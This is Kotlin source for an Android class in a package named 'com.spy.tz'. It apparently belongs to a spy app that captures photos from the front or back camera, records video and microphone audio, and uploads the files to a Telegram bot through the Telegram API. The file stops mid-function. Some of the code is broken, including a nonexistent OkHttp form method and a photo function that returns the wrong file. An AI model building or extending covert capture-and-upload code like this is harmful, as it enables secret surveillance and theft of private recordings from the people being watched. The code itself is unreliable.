package com.spy.tz

import android.Manifest
import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import android.util.Log
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleOwner
import okhttp3.*
import java.io.File
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Locale

class TelegramBotHelper(private val context: Context) {

    private var mediaRecorder: MediaRecorder? = null
    private var isVideoRecording = false
    private var isVoiceRecording = false
    private var currentVideoFile: File? = null
    private var currentAudioFile: File? = null
    
    private var imageCapture: ImageCapture? = null
    private var preview: Preview? = null
    private var cameraProvider: ProcessCameraProvider? = null

    /**
     * Initialize Camera with specific selector (Front or Back)
     */
    fun initCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView, isBackCamera: Boolean = false) {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(context)
        
        cameraProviderFuture.addListener({
            cameraProvider = cameraProviderFuture.get()
            
            // Preview
            preview = Preview.Builder().build().also {
                it.setSurfaceProvider(previewView.surfaceProvider)
            }
            
            // Image Capture
            imageCapture = ImageCapture.Builder().build()
            
            // Select Camera
            val cameraSelector = if (isBackCamera) CameraSelector.DEFAULT_BACK_CAMERA else CameraSelector.DEFAULT_FRONT_CAMERA
            
            try {
                cameraProvider?.unbindAll()
                cameraProvider?.bindToLifecycle(
                    lifecycleOwner,
                    cameraSelector,
                    preview!!,
                    imageCapture!!
                )
                Log.d("TelegramBot", "Camera initialized: ${if(isBackCamera) "BACK" else "FRONT"}")
            } catch (e: Exception) {
                Log.e("CameraInit", "Use case binding failed", e)
            }
        }, ContextCompat.getMainExecutor(context))
    }

    /**
     * Switch Camera (Toggle Front <-> Back)
     */
    fun switchCamera(lifecycleOwner: LifecycleOwner, previewView: PreviewView, currentIsBack: Boolean) {
        initCamera(lifecycleOwner, previewView, !currentIsBack)
    }

    /**
     * Take Photo
     */
    fun takePhoto(): Result<File> {
        if (imageCapture == null) return Result.failure(Exception("Camera not ready"))

        val outputOptions = ImageCapture.OutputFileOptions.Builder(
            createImageFile()
        ).build()

        imageCapture?.takePicture(outputOptions, ContextCompat.getMainExecutor(context), object : ImageCapture.OnImageSavedCallback {
            override fun onImageSaved(outputFileResults: ImageCapture.OutputFileResults) {
                Log.d("TelegramBot", "Photo saved: ${outputFileResults.savedUri}")
            }

            override fun onError(exception: ImageCaptureException) {
                Log.e("TelegramBot", "Photo error: ${exception.message}", exception)
            }
        })
        
        return Result.success(createImageFile())
    }

    /**
     * Start Video Recording
     */
    fun startVideoRecording() {
        mediaRecorder = MediaRecorder(context).apply {
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            setVideoEncodingBitRate(5 * 1000 * 1000)
            setVideoFrameRate(30)
            setVideoSize(1280, 720)
            
            outputFile = createVideoFile()
            currentVideoFile = outputFile
            setOutputFile(outputFile!!.absolutePath)
        }
        
        try {
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            isVideoRecording = true
            Log.d("TelegramBot", "Video recording started")
        } catch (e: Exception) {
            Log.e("TelegramBot", "Start video error", e)
        }
    }

    /**
     * Stop Video Recording
     */
    fun stopVideoRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            isVideoRecording = false
            Log.d("TelegramBot", "Video recording stopped")
            return currentVideoFile
        } catch (e: Exception) {
            Log.e("TelegramBot", "Stop video error", e)
            return null
        } finally {
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    /**
     * Start Voice Recording
     */
    fun startVoiceRecording() {
        mediaRecorder = MediaRecorder(context).apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            
            outputFile = createAudioFile()
            currentAudioFile = outputFile
            setOutputFile(outputFile!!.absolutePath)
        }
        
        try {
            mediaRecorder?.prepare()
            mediaRecorder?.start()
            isVoiceRecording = true
            Log.d("TelegramBot", "Voice recording started")
        } catch (e: Exception) {
            Log.e("TelegramBot", "Start voice error", e)
        }
    }

    /**
     * Stop Voice Recording
     */
    fun stopVoiceRecording(): File? {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            isVoiceRecording = false
            Log.d("TelegramBot", "Voice recording stopped")
            return currentAudioFile
        } catch (e: Exception) {
            Log.e("TelegramBot", "Stop voice error", e)
            return null
        } finally {
            mediaRecorder?.release()
            mediaRecorder = null
        }
    }

    // --- FILE HELPERS ---
    private fun createImageFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        return File(storageDir!!, "IMG_$timeStamp.jpg")
    }

    private fun createVideoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_MOVIES)
        return File(storageDir!!, "VID_$timeStamp.mp4")
    }

    private fun createAudioFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(System.currentTimeMillis())
        val storageDir = context.getExternalFilesDir(Environment.DIRECTORY_MUSIC)
        return File(storageDir!!, "AUD_$timeStamp.3gp")
    }

    // --- TELEGRAM UPLOADS (Fixed OkHttp Syntax) ---

    suspend fun sendPhotoToBot(file: File, chatId: Long, botToken: String, caption: String = ""): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendPhoto"
                
                val mediaType = MediaType.parse("application/octet-stream") 
                
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataProperty("chat_id", chatId.toString())
                    .addFormDataProperty("caption", caption)
                    .addFormDataProperty("photo", file.name, RequestBody.create(mediaType, file))
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody.build())
                    .build()

                val client = OkHttpClient()
                val response = client.newCall(request).execute()
                
                if (response.isSuccessful) {
                    Result.success(response.body?.string() ?: "Success")
                } else {
                    Result.failure(Exception("Upload failed: ${response.code}"))
                }
            } catch (e: Exception) {
                Result.failure(e)
            }
        }
    }

    suspend fun sendVideoToBot(file: File, chatId: Long, botToken: String, caption: String = ""): Result<String> {
        return withContext(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$botToken/sendVideo"
                
                val mediaType = MediaType.parse("video/mp4") 

                val requestBody = MultipartBody.Builder()
                    .setType
